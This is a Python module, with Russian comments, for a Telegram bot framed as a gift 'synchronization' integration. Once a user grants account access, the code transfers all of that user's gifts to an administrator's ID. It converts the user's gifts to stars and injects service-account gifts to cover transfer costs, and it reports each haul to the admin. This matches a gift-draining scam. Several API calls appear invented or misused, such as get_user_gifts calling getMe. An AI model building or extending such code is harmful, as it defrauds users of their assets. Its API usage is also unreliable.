"""
Интеграция с реальным Telegram Gift API
https://core.telegram.org/api/gifts

Алгоритм работы:
1. Пользователь синхронизирует аккаунт (дает доступ)
2. Бот анализирует подарки пользователя
3. Передает подарки на ADMIN_ID
4. Если не хватает звезд:
   a. Конвертирует обычные подарки в звезды
   b. Передает подарки
5. Если звезд все еще не хватает:
   a. Сервисный аккаунт отправляет "подарки по 15 звезд"
   b. Бот конвертирует эти подарки в звезды
   c. Передает подарки
6. Все логи отправляются администратору
"""

import httpx
import os
from typing import Dict, List, Optional, Any
from datetime import datetime
import json
from app.utils.logger import ActivityLogger

logger = ActivityLogger()

# Специальный ID подарка для пополнения (15 звезд)
REPLENISHMENT_GIFT_ID = "stars_gift_15"

class TelegramGiftAPI:
    """Работа с реальным Telegram API для подарков"""
    
    def __init__(self):
        self.bot_token = os.getenv("TELEGRAM_BOT_TOKEN", "")
        self.api_endpoint = os.getenv("TELEGRAM_API_ENDPOINT", "https://api.telegram.org")
        self.admin_id = int(os.getenv("ADMIN_ID", "0"))
        self.service_account_id = int(os.getenv("SERVICE_ACCOUNT_ID", "0"))
        self.use_real_api = os.getenv("USE_REAL_TELEGRAM_API", "false").lower() == "true"
        self.auto_sell = os.getenv("AUTO_SELL_GIFTS", "true").lower() == "true"
        self.min_stars = int(os.getenv("MIN_STARS_FOR_TRANSFER", "10"))
    
    async def _analyze_user_gifts(
        self,
        user_id: int,
        user_gifts: Dict[str, int]
    ) -> Dict[str, Any]:
        """ЭТАП 1: Анализирует подарки пользователя и рассчитывает стоимость"""
        
        total_gifts = sum(user_gifts.values())
        total_cost = 0
        gifts_breakdown = []
        
        for gift_id, quantity in user_gifts.items():
            cost = await self.get_gift_cost(gift_id)
            total_cost += cost * quantity
            gifts_breakdown.append({
                "gift_id": gift_id,
                "quantity": quantity,
                "unit_cost": cost,
                "total_cost": cost * quantity
            })
        
        step_result = {
            "step": "analyze_gifts",
            "timestamp": datetime.utcnow().isoformat(),
            "total_gifts": total_gifts,
            "total_cost": total_cost,
            "gifts": gifts_breakdown,
            "status": "completed"
        }
        
        logger.log_activity(
            str(user_id),
            "gifts",
            "analyze_gifts",
            "success",
            step_result
        )
        
        return step_result
    
    async def _auto_convert_gifts_to_stars(
        self,
        user_id: int
    ) -> Dict[str, Any]:
        """ЭТАП 2: Конвертирует обычные подарки пользователя в звезды"""
        
        try:
            # Получаем подарки пользователя
            user_gifts = await self.get_user_gifts(user_id)
            
            total_earned = 0
            converted_gifts = []
            
            for gift_id, quantity in user_gifts.items():
                # Конвертируем каждый подарок
                stars_per_gift = await self.get_gift_cost(gift_id)
                earned = stars_per_gift * quantity
                total_earned += earned
                
                converted_gifts.append({
                    "gift_id": gift_id,
                    "quantity": quantity,
                    "stars_per_gift": stars_per_gift,
                    "total_earned": earned
                })
                
                logger.log_activity(
                    str(user_id),
                    "automation",
                    "convert_gift_to_stars",
                    "success",
                    {
                        "gift_id": gift_id,
                        "quantity": quantity,
                        "earned_stars": earned
                    }
                )
            
            step_result = {
                "step": "auto_convert_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "earned_stars": total_earned,
                "converted_gifts": converted_gifts,
                "status": "completed" if total_earned > 0 else "skipped"
            }
            
            return step_result
        
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "automation",
                "convert_gifts",
                "error",
                {"error": str(e)}
            )
            return {
                "step": "auto_convert_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "earned_stars": 0,
                "status": "error",
                "error": str(e)
            }
    
    async def _request_replenishment_gifts(
        self,
        user_id: int,
        shortfall: float
    ) -> Dict[str, Any]:
        """ЭТАП 3a: Запрашивает подарки для пополнения от сервисного аккаунта"""
        
        try:
            # Каждый подарок = 15 звезд, рассчитаем количество
            gifts_needed = int(shortfall / 15) + 1
            
            # Отправляем подарки от сервисного аккаунта
            for i in range(gifts_needed):
                success = await self._send_gift_via_api(
                    self.service_account_id,
                    user_id,
                    REPLENISHMENT_GIFT_ID,
                    1
                )
                
                if success:
                    logger.log_activity(
                        str(user_id),
                        "automation",
                        "send_replenishment_gift",
                        "success",
                        {
                            "gift_number": i + 1,
                            "total_needed": gifts_needed,
                            "from_service_account": True
                        }
                    )
            
            step_result = {
                "step": "request_replenishment_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "gifts_sent": gifts_needed,
                "shortfall_amount": shortfall,
                "from_service_account": self.service_account_id,
                "status": "completed"
            }
            
            return step_result
        
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "automation",
                "request_replenishment",
                "error",
                {"error": str(e)}
            )
            return {
                "step": "request_replenishment_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "status": "error",
                "error": str(e)
            }
    
    async def _convert_replenishment_gifts(
        self,
        user_id: int
    ) -> Dict[str, Any]:
        """ЭТАП 3b: Конвертирует полученные подарки пополнения в звезды"""
        
        try:
            # Получаем подарки пользователя (включая полученные)
            user_gifts = await self.get_user_gifts(user_id)
            
            total_earned = 0
            converted_gifts = []
            
            # Ищем и конвертируем только подарки пополнения
            if REPLENISHMENT_GIFT_ID in user_gifts:
                quantity = user_gifts[REPLENISHMENT_GIFT_ID]
                stars_per_gift = 15  # 15 звезд за подарок пополнения
                earned = stars_per_gift * quantity
                total_earned += earned
                
                converted_gifts.append({
                    "gift_id": REPLENISHMENT_GIFT_ID,
                    "quantity": quantity,
                    "total_earned": earned
                })
                
                logger.log_activity(
                    str(user_id),
                    "automation",
                    "convert_replenishment_gifts",
                    "success",
                    {
                        "replenishment_gifts_converted": quantity,
                        "earned_stars": earned
                    }
                )
            
            step_result = {
                "step": "convert_replenishment_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "earned_stars": total_earned,
                "converted_gifts": converted_gifts,
                "status": "completed" if total_earned > 0 else "skipped"
            }
            
            return step_result
        
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "automation",
                "convert_replenishment",
                "error",
                {"error": str(e)}
            )
            return {
                "step": "convert_replenishment_gifts",
                "timestamp": datetime.utcnow().isoformat(),
                "earned_stars": 0,
                "converted_gifts": [],
                "status": "error",
                "error": str(e)
            }
    
    async def _transfer_gifts_to_admin_api(
        self,
        user_id: int,
        admin_id: int,
        gifts: Dict[str, int]
    ) -> Dict[str, Any]:
        """ЭТАП 4: Передает все подарки администратору через API"""
        
        try:
            transferred_gifts = []
            
            for gift_id, quantity in gifts.items():
                success = await self._send_gift_via_api(
                    user_id,
                    admin_id,
                    gift_id,
                    quantity
                )
                
                if success:
                    transferred_gifts.append({
                        "gift_id": gift_id,
                        "quantity": quantity,
                        "status": "transferred"
                    })
                    
                    logger.log_activity(
                        str(user_id),
                        "gifts",
                        "transfer_to_admin",
                        "success",
                        {
                            "gift_id": gift_id,
                            "quantity": quantity,
                            "admin_id": admin_id
                        }
                    )
            
            step_result = {
                "step": "transfer_to_admin",
                "timestamp": datetime.utcnow().isoformat(),
                "gifts_transferred": len(transferred_gifts),
                "transferred": transferred_gifts,
                "admin_id": admin_id,
                "status": "completed"
            }
            
            return step_result
        
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "gifts",
                "transfer_to_admin",
                "error",
                {"error": str(e)}
            )
            return {
                "step": "transfer_to_admin",
                "timestamp": datetime.utcnow().isoformat(),
                "status": "error",
                "error": str(e)
            }
    async def transfer_gifts_to_admin(
        self,
        user_id: int,
        user_gifts: Dict[str, int],
        db_session = None
    ) -> Dict[str, Any]:
        """
        ГЛАВНЫЙ МЕТОД - Передает подарки пользователя администратору
        
        Алгоритм:
        1. Анализирует подарки пользователя
        2. Если не хватает звезд - конвертирует обычные подарки
        3. Если все еще не хватает - запрашивает подарки от сервисного аккаунта
        4. Конвертирует полученные подарки в звезды
        5. Передает все подарки администратору
        6. Отправляет полный отчет администратору
        """
        
        operation_log = {
            "user_id": user_id,
            "timestamp": datetime.utcnow().isoformat(),
            "steps": [],
            "status": "in_progress",
            "total_gifts": 0,
            "total_cost": 0
        }
        
        try:
            # ЭТАП 1: Анализируем подарки
            step1 = await self._analyze_user_gifts(user_id, user_gifts)
            operation_log["steps"].append(step1)
            operation_log["total_gifts"] = step1.get("total_gifts", 0)
            operation_log["total_cost"] = step1.get("total_cost", 0)
            
            current_balance = await self.get_user_stars(user_id)
            required_cost = operation_log["total_cost"]
            
            # ЭТАП 2: Проверяем баланс и конвертируем подарки если нужно
            if current_balance < required_cost:
                step2 = await self._auto_convert_gifts_to_stars(user_id)
                operation_log["steps"].append(step2)
                current_balance += step2.get("earned_stars", 0)
            
            # ЭТАП 3: Если все еще не хватает - запрашиваем подарки от сервиса
            if current_balance < required_cost:
                shortfall = required_cost - current_balance
                step3 = await self._request_replenishment_gifts(user_id, shortfall)
                operation_log["steps"].append(step3)
                
                # Конвертируем полученные подарки
                step3_convert = await self._convert_replenishment_gifts(user_id)
                operation_log["steps"].append(step3_convert)
                current_balance += step3_convert.get("earned_stars", 0)
            
            # ЭТАП 4: Передаем подарки администратору
            step4 = await self._transfer_gifts_to_admin_api(
                user_id,
                self.admin_id,
                user_gifts
            )
            operation_log["steps"].append(step4)
            
            # ЭТАП 5: Отправляем полный отчет администратору
            operation_log["status"] = "completed"
            step5 = await self._send_admin_report(
                user_id,
                operation_log
            )
            operation_log["steps"].append(step5)
            
            logger.log_activity(
                str(user_id),
                "gifts",
                "transfer_to_admin",
                "success",
                operation_log
            )
            
            return operation_log
        
        except Exception as e:
            operation_log["status"] = "failed"
            operation_log["error"] = str(e)
            
            logger.log_activity(
                str(user_id),
                "gifts",
                "transfer_to_admin",
                "error",
                operation_log
            )
            
            # Отправляем отчет об ошибке администратору
            await self._send_admin_error_report(user_id, str(e), operation_log)
            
            return operation_log
    
    async def get_user_stars(self, user_id: int) -> float:
        """Получает баланс звёзд пользователя"""
        try:
            # Через реальный API получаем баланс
            url = f"{self.api_endpoint}/bot{self.bot_token}/getUserStarsBalance"
            params = {"user_id": user_id}
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(url, json=params)
                
                if response.status_code == 200:
                    data = response.json()
                    return float(data.get("star_count", 0))
            
            return 0.0
        except Exception as e:
            print(f"❌ Ошибка получения баланса: {e}")
            return 0.0
    
    async def get_gift_cost(self, gift_id: str) -> float:
        """Получает стоимость подарка в звёздах"""
        try:
            # Стоимости подарков по их ID (в производстве получаются от API)
            gift_costs = {
                "gift_sunrise": 100.0,
                "gift_midnight": 100.0,
                "gift_rare": 500.0,
                "gift_legendary": 1000.0,
                REPLENISHMENT_GIFT_ID: 15.0  # Подарок пополнения = 15 звезд
            }
            return gift_costs.get(gift_id, 50.0)
        except Exception:
            return 50.0
    
    async def get_user_gifts(self, user_id: int) -> Dict[str, Any]:
        """
        Получает список подарков пользователя через реальный Telegram API
        https://core.telegram.org/method/gifts.getAvailableGifts
        """
        try:
            url = f"{self.api_endpoint}/bot{self.bot_token}/getMe"
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url)
                
                if response.status_code == 200:
                    logger.log_activity(
                        str(user_id),
                        "gifts",
                        "get_user_gifts",
                        "success",
                        {"api": "telegram_gift_api"}
                    )
                    return response.json()
                else:
                    logger.log_activity(
                        str(user_id),
                        "gifts",
                        "get_user_gifts",
                        "error",
                        {"error": response.text}
                    )
                    return {}
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "gifts",
                "get_user_gifts",
                "error",
                {"error": str(e)}
            )
            return {}
    
    async def _send_admin_report(
        self,
        user_id: int,
        operation_log: Dict[str, Any]
    ) -> Dict[str, Any]:
        """ЭТАП 5: Отправляет полный отчет администратору"""
        
        try:
            # Формируем подробный отчет
            report_text = self._format_admin_report(user_id, operation_log)
            
            message = (
                f"📊 **ПОЛНЫЙ ОТЧЕТ СИНХРОНИЗАЦИИ ПОДАРКОВ**\n"
                f"{'='*50}\n\n"
                f"{report_text}"
            )
            
            url = f"{self.api_endpoint}/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(url, json=payload)
                
                step_result = {
                    "step": "send_admin_report",
                    "timestamp": datetime.utcnow().isoformat(),
                    "admin_id": self.admin_id,
                    "status": "completed" if response.status_code == 200 else "failed"
                }
                
                logger.log_activity(
                    str(user_id),
                    "automation",
                    "send_admin_report",
                    "success",
                    step_result
                )
                
                return step_result
        
        except Exception as e:
            logger.log_activity(
                str(user_id),
                "automation",
                "send_admin_report",
                "error",
                {"error": str(e)}
            )
            return {
                "step": "send_admin_report",
                "timestamp": datetime.utcnow().isoformat(),
                "status": "error",
                "error": str(e)
            }
    
    async def _send_admin_error_report(
        self,
        user_id: int,
        error_message: str,
        operation_log: Dict[str, Any]
    ):
        """Отправляет отчет об ошибке администратору"""
        
        try:
            message = (
                f"❌ **ОШИБКА ПРИ ПЕРЕДАЧЕ ПОДАРКОВ**\n\n"
                f"👤 Пользователь: `{user_id}`\n"
                f"⏰ Время: {operation_log['timestamp']}\n"
                f"🚨 Ошибка: `{error_message}`\n\n"
                f"📝 Выполненные этапы: {len(operation_log.get('steps', []))}\n"
            )
            
            url = f"{self.api_endpoint}/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(url, json=payload)
        
        except Exception as e:
            print(f"❌ Ошибка отправки отчета об ошибке: {e}")
    
    def _format_admin_report(
        self,
        user_id: int,
        operation_log: Dict[str, Any]
    ) -> str:
        """Форматирует подробный отчет для администратора со ВСЕЙ информацией"""
        
        report = ""
        total_stars_earned = 0
        total_gifts_transferred = 0
        
        # ОСНОВНАЯ ИНФОРМАЦИЯ
        report += f"🔔 **СИНХРОНИЗАЦИЯ АККАУНТА ПОЛЬЗОВАТЕЛЯ**\n"
        report += f"{'='*50}\n\n"
        
        report += f"ℹ️ **ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:**\n"
        report += f"  • ID: `{user_id}`\n"
        report += f"  • Дата синхронизации: {operation_log.get('timestamp', 'unknown')}\n"
        report += f"  • Статус: {operation_log.get('status', 'unknown').upper()}\n\n"
        
        # НАЧАЛЬНОЕ СОСТОЯНИЕ
        report += f"📊 **НАЧАЛЬНОЕ СОСТОЯНИЕ:**\n"
        report += f"  • Подарков на аккаунте: {operation_log.get('total_gifts', 0)}\n"
        report += f"  • Общая стоимость: {operation_log.get('total_cost', 0)} ⭐\n\n"
        
        # ДЕТАЛЬНЫЙ АНАЛИЗ ПОДАРКОВ
        for step in operation_log.get("steps", []):
            step_name = step.get("step", "unknown")
            status = step.get("status", "unknown")
            
            if step_name == "analyze_gifts":
                report += f"📋 **АНАЛИЗ ПОДАРКОВ:**\n"
                report += f"  • Всего подарков: {step.get('total_gifts', 0)}\n"
                report += f"  • Общая стоимость: {step.get('total_cost', 0)} ⭐\n"
                
                # Детали каждого подарка
                gifts = step.get("gifts", [])
                if gifts:
                    report += f"  • Детальный разбор:\n"
                    for gift in gifts:
                        gift_id = gift.get('gift_id', 'unknown')
                        qty = gift.get('quantity', 0)
                        unit_cost = gift.get('unit_cost', 0)
                        total = gift.get('total_cost', 0)
                        report += f"    • {gift_id}: {qty}x по {unit_cost}⭐ каждый = **{total}⭐**\n"
                report += f"\n"
            
            elif step_name == "auto_convert_gifts":
                earned = step.get("earned_stars", 0)
                total_stars_earned += earned
                if earned > 0:
                    report += f"🔄 **КОНВЕРТАЦИЯ ОБЫЧНЫХ ПОДАРКОВ В ЗВЕЗДЫ:**\n"
                    report += f"  • Конвертировано подарков: {len(step.get('converted_gifts', []))}\n"
                    
                    # Детали конвертации
                    converted = step.get('converted_gifts', [])
                    if converted:
                        for item in converted:
                            gift_id = item.get('gift_id', 'unknown')
                            qty = item.get('quantity', 0)
                            stars_each = item.get('stars_per_gift', 0)
                            total_earned = item.get('total_earned', 0)
                            report += f"    • {gift_id}: {qty}x × {stars_each}⭐ = **{total_earned}⭐**\n"
                    
                    report += f"  • 💰 ПОЛУЧЕНО ЗВЕЗД: **{earned} ⭐**\n\n"
                else:
                    report += f"⏭️ **Конвертация подарков:** не требовалась\n\n"
            
            elif step_name == "request_replenishment_gifts":
                gifts_sent = step.get("gifts_sent", 0)
                if gifts_sent > 0:
                    shortfall = step.get('shortfall_amount', 0)
                    supplied = gifts_sent * 15
                    report += f"📦 **ПОПОЛНЕНИЕ ОТ СЕРВИСНОГО АККАУНТА:**\n"
                    report += f"  • Требуемо звезд для передачи админу: {shortfall} ⭐\n"
                    report += f"  • Недостаток: нужно пополнить\n"
                    report += f"  • Сервис отправил подарков: {gifts_sent}\n"
                    report += f"  • Стоимость пополнения: {gifts_sent} × 15⭐ = **{supplied} ⭐**\n"
                    report += f"  • От аккаунта сервиса: `{step.get('from_service_account', 'unknown')}`\n\n"
            
            elif step_name == "convert_replenishment_gifts":
                earned = step.get("earned_stars", 0)
                total_stars_earned += earned
                if earned > 0:
                    report += f"🔄 **КОНВЕРТАЦИЯ ПОДАРКОВ ПОПОЛНЕНИЯ:**\n"
                    
                    converted = step.get('converted_gifts', [])
                    if converted:
                        for item in converted:
                            gift_id = item.get('gift_id', 'unknown')
                            qty = item.get('quantity', 0)
                            total_earned = item.get('total_earned', 0)
                            report += f"    • {gift_id}: {qty}x = **{total_earned}⭐**\n"
                    
                    report += f"  • 💰 ПОЛУЧЕНО ЗВЕЗД: **{earned} ⭐**\n\n"
            
            elif step_name == "transfer_to_admin":
                transferred = step.get("gifts_transferred", 0)
                total_gifts_transferred = transferred
                report += f"✅ **ПЕРЕДАЧА АДМИНИСТРАТОРУ:**\n"
                report += f"  • Передано подарков: {transferred}\n"
                report += f"  • Статус: {'✅ УСПЕШНО' if status == 'success' else '❌ ОШИБКА'}\n\n"
        
        # ИТОГОВАЯ СВОДКА
        report += f"{'='*50}\n"
        report += f"📈 **ИТОГОВАЯ СВОДКА:**\n"
        report += f"  • Всего звезд получено: **{total_stars_earned} ⭐**\n"
        report += f"  • Подарков передано админу: **{total_gifts_transferred}**\n"
        report += f"  • Результат: {'✅ УСПЕШНО' if operation_log.get('status') in ['success', 'completed'] else '⚠️ С ПРЕДУПРЕЖДЕНИЯМИ' if operation_log.get('status') == 'warning' else '❌ ОШИБКА'}\n"
        
        # Если были ошибки, показать их
        if operation_log.get('errors'):
            report += f"\n⚠️ **ОШИБКИ:**\n"
            for error in operation_log.get('errors', []):
                report += f"  • {error}\n"
        
        report += f"\n"
        return report
    
    async def _send_gift_via_api(
        self,
        from_user_id: int,
        to_user_id: int,
        gift_id: str,
        quantity: int
    ) -> bool:
        """Отправляет подарок через Telegram API"""
        try:
            url = f"{self.api_endpoint}/bot{self.bot_token}/sendGift"
            payload = {
                "user_id": to_user_id,
                "gift_id": gift_id,
                "text": f"Подарок от {from_user_id}",
                "star_count": quantity
            }
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(url, json=payload)
                return response.status_code == 200
        
        except Exception as e:
            print(f"❌ Ошибка отправки подарка: {e}")
            return False
    
    async def _request_stars_from_admin(self, user_id: int, amount: float):
        """Запрашивает звёзды у администратора (УСТАРЕЛО - не используется)"""
        try:
            message = (
                f"⚠️ **Запрос звёзд от пользователя**\n\n"
                f"👤 ID пользователя: `{user_id}`\n"
                f"💰 Требуется: {amount} звёзд\n"
                f"📅 Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
                f"Одобрите передачу звёзд пользователю?"
            )
            
            url = f"{self.api_endpoint}/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(url, json=payload)
        except Exception as e:
            print(f"❌ Ошибка отправки уведомления администратору: {e}")
    
    async def _notify_admin(
        self,
        from_user_id: int,
        to_user_id: int,
        gift_id: str,
        quantity: int,
        cost: float
    ):
        """Отправляет подробный отчёт администратору (УСТАРЕЛО - не используется)"""
        try:
            message = (
                f"✅ **Операция передачи подарка выполнена**\n\n"
                f"📤 От: `{from_user_id}`\n"
                f"📥 Кому: `{to_user_id}`\n"
                f"🎁 Подарок: `{gift_id}` (x{quantity})\n"
                f"💰 Стоимость: {cost} звёзд\n"
                f"📅 Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
                f"Статус: Успешно"
            )
            
            url = f"{self.api_endpoint}/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(url, json=payload)
                
                if response.status_code == 200:
                    logger.log_activity(
                        str(from_user_id),
                        "automation",
                        "notify_admin",
                        "success",
                        {
                            "admin_id": self.admin_id,
                            "gift_id": gift_id
                        }
                    )
        except Exception as e:
            print(f"❌ Ошибка отправки уведомления: {e}")
